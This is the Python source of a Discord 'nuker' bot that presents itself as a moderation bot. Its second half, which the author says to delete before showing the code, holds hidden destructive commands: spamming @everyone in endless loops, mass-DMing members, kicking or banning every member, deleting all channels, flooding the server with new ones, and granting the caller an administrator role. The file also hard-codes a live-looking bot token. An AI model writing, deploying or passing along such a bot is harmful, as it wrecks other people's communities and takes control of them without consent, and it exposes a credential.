import discord
import asyncio
import time
from discord.ext import commands

TOKEN = "MTA2NzkyNTQ5Njk3OTAwOTY3Nw.GnWbbY.dcRMFxsf6T5ndZaXzIIK0s9_mkWkLHc5V_3Qd4"
PREFIX = "!"
DM_MESSAGE = "wowee, a dm :D"
SPAM_MESSAGE = "the message it sends when it creates the channel, @everyone is already provided"
CHANNEL_NAME = "FUCKED BY *your name here*"
ROLE_NAME = ":D"
BOT_INVITE = "https://discord.com/api/oauth2/authorize?client_id=1067925496979009677&permissions=8&scope=bot"


client = commands.Bot(command_prefix=PREFIX,intents=discord.Intents.all())

client.remove_command("help")


@client.event
async def on_ready():
    print ("""            ██╗   ██╗ ██████╗ ██╗██████╗          
            ██║   ██║██╔═══██╗██║██╔══██╗         
            ██║   ██║██║   ██║██║██║  ██║         
            ╚██╗ ██╔╝██║   ██║██║██║  ██║         
             ╚████╔╝ ╚██████╔╝██║██████╔╝         
              ╚═══╝   ╚═════╝ ╚═╝╚═════╝          
                                                  
    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ ██╗
    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗██║
    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝██║
    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗╚═╝
    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║██╗
    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝
                                                  """)
    print("Creator: am weirder!#8551/am normal?#8220")
    print(f"Logged in as {client.user}!")
    print(f"""~~Normal Commands~~
    {PREFIX}ping - Pong!
    {PREFIX}kick - Kick a specific user
    {PREFIX}ban - Ban a specific user
    {PREFIX}info - Get info on a specific user
    {PREFIX}invite - Return an invite of the bot
    {PREFIX}clear - Clear a specific amount of messages
  ~~~Fun Commands~~~
    {PREFIX}dmeveryoneinserver - DM everyone in the server {DM_MESSAGE}
    {PREFIX}kickallmemberslmao - Kick all members
    {PREFIX}takecareofchannelsandban - Deletes all channels, and replaces them with a lot of channels named #{CHANNEL_NAME}. Also bans everyone.
    {PREFIX}giveadmintoyourself - Gives admin to yourself, letting you do anything!
    """)

@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))

@client.command(pass_context=True)
async def help(ctx):
    author = ctx.message.author

    embed = discord.Embed(
        colour = discord.Colour.blue()
    )

    embed.set_author(name='help')
    embed.add_field(name=f'{PREFIX}ping', value='Pong!', inline=False)
    embed.add_field(name=f'{PREFIX}kick', value='Kicks specified user', inline=False)
    embed.add_field(name=f'{PREFIX}ban', value='Bans specified user', inline=False)
    embed.add_field(name=f'{PREFIX}info', value='Gives information of a user', inline=False)
    embed.add_field(name=f'{PREFIX}invite', value='Returns invite link of the client', inline=False)
    embed.add_field(name=f'{PREFIX}clear', value='Clears an X amount of messages', inline=False)
    embed.add_field(name=f'{PREFIX}help', value='Shows this embed', inline=False)
    await client.send_message(author, embed=embed)


@client.command(pass_context=True)
async def clear(ctx, amount=10):
    await ctx.channel.purge(limit=amount)
    await ctx.send('Messages deleted')

@client.command(pass_context=True)
async def ping(ctx):
	await ctx.send('Pong!')

@client.command(pass_context=True)
async def info(ctx, user: discord.Member=None):
    if user is None:
        await ctx.send('Please input a user.')
    else:
        await ctx.send("The user's name is: {}".format(user.name) + "\nThe user's ID is: {}".format(user.id) + "\nThe user's current status is: {}".format(user.status) + "\nThe user's highest role is: {}".format(user.top_role) + "\nThe user joined at: {}".format(user.joined_at))

@client.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send(f'Get kicked, {member}!')

@client.command()
@commands.has_permissions(kick_members=True)
async def ban(ctx, member: discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send(f'Get banned, {member}!')

@client.command(pass_context=True)
async def invite(ctx):
    await ctx.send(BOT_INVITE)

#
#~~~~~~~~~~
#Fun Commands! (DELETE FROM HERE ON IF YOU ARE SHOWING SOURCE CODE)
#~~~~~~~~~~
#

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(f"@everyone {SPAM_MESSAGE}")

@client.command(pass_context=True)
async def dmeveryoneinserver(ctx):
        for user in ctx.guild.members:
            try:
                await user.send(DM_MESSAGE)
                print(f"Sent {user.name} a DM.")
            except:
                print(f"Couldn't DM {user.name}.")
        print("Sent all the server a DM")

@client.command(pass_context=True)
async def kickallmemberslmao(ctx):
        for user in list(ctx.message.guild.members):
            try:
                await client.kick(user)
                print ("User " + user.name + " has been kicked from " + ctx.message.guild.name)
            except:
                pass
        print ("Kicked all members!")

@client.command(pass_context=True)
async def takecareofchannelsandban(ctx):
    for member in ctx.guild.members:
        try:
            if member == ctx.author:
                pass
            else: 
                await member.ban()
                await ctx.send(f"Successfully ban {member}")
        except Exception as e:
            await ctx.send(f"Unable to ban {member} {e}")
    for chan in ctx.guild.channels:
        try:
            await chan.delete()
        except:
            pass
    while True:
      channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name='nuked')
      await ctx.guild.create_text_channel(CHANNEL_NAME)
    print ("Server has been nuked, your welcome :D")

@client.command(pass_context=True)
async def giveadmintoyourself(ctx):
    perms = discord.Permissions(8)
    guild = ctx.guild
    await guild.create_role(name=ROLE_NAME, permissions=perms)
    user = ctx.author
    role = discord.utils.get(user.guild.roles, 
    name=ROLE_NAME)
    await user.add_roles(role)
    print ("You're in buddy, dont fuck this up. You got this!")


client.run(TOKEN)  # Starts the bot
